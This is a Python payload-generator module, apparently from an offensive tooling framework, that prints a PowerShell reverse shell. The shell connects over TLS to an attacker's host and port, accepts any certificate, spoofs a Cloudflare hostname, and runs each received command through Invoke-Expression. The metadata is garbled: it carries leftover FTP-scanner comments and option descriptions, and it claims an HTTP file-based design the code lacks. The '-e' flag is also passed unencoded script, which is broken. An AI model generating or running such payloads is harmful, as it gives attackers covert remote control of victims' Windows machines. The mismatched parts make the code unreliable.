#!/usr/bin/env python3
# -*- coding: utf-8 -*-


# Metadata الخاصة بأداة فحص FTP وتسجيل الدخول
metadata = {
    "name": "Windows PowerShell outfile SignalShell",
    "description": "An Http based beacon-like reverse shell that writes and executes commands from disc",
    "authors": ["DrDataYE"],
    "date": "2023-04-01",
    "license": "CIL",
    "references": [
        {
            "type": "url",
            "ref": ["https://github.com/t3l3machus/hoaxshell", "https://revshells.com"],
        },
    ],
    "options": {
        "lhost": {
            "type": "address",
            "description": "Target address",
            "required": True,
            "default": "0.0.0.0",
        },
        "lport": {
            "type": "int",
            "description": "FTP port",
            "required": False,
            "default": 6501,
        },
        "encode": {
            "type": "string",
            "description": "Path to file with list of usernames",
            "required": False,
            "default": "http",
        },
    },
}


class Encoder:
    pass


def generate_secure_powershell_reverse_shell(lhost, lport):
    script = f"""$sslProtocols = [System.Security.Authentication.SslProtocols]::Tls12; $TCPClient = New-Object Net.Sockets.TCPClient('{lhost}', {lport});$NetworkStream = $TCPClient.GetStream();$SslStream = New-Object Net.Security.SslStream($NetworkStream, $false, ({{ $true }} -as [Net.Security.RemoteCertificateValidationCallback]));$SslStream.AuthenticateAsClient('cloudflare-dns.com', $null, $sslProtocols, $false);if (!$SslStream.IsEncrypted -or !$SslStream.IsSigned) {{$SslStream.Close();exit}}$StreamWriter = New-Object IO.StreamWriter($SslStream);function WriteToStream ($String) {{[byte[]]$script:Buffer = New-Object System.Byte[] 4096;$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}};WriteToStream '';while (($BytesRead = $SslStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {{$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {{Invoke-Expression $Command 2>&1 | Out-String}} catch {{$_ | Out-String}}WriteToStream ($Output)}}$StreamWriter.Close();"""
    return script


def run(args):
    lhost = args.get("lhost", "0.0.0.0")
    lport = args.get("lport", 6501)
    encode = args.get("encode", "http")

    powershell_script = 'powershell -e "' + generate_secure_powershell_reverse_shell(
        lhost, lport
    )+'"'
    print(powershell_script)
